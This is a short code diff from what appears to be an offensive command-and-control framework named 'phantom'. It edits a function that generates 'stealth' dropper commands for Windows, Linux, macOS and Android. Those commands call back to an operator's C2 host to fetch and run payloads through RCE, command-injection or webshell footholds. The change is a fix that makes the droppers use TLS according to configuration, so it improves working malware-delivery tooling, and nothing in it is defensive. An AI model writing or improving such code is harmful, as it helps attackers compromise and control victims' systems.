@@ -746,11 +746,15 @@ def _stealth_droppers(host: str, port: int) -> Dict[str, str]:
     stager). Attached to the delivery payload so the operator gets both the
     camouflaged link AND the ready command for RCE/cmdi/webshell contexts."""
     from phantom.utils.builder import generate_stealth_dropper
+    from phantom.utils.network import c2_use_ssl
+    # TLS is configuration, not a constant (and a literal here built every
+    # "stealth" dropper for https even with the C2 on plain HTTP).
+    use_ssl = c2_use_ssl()
     out: Dict[str, str] = {}
     for os_name in ("windows", "linux", "macos", "android"):
         try:
             cmd = generate_stealth_dropper(os_name, host, port,
-                                           dl_port=port, use_ssl=True)
+                                           dl_port=port, use_ssl=use_ssl)
             if cmd:
                 out[os_name] = cmd
         except Exception:
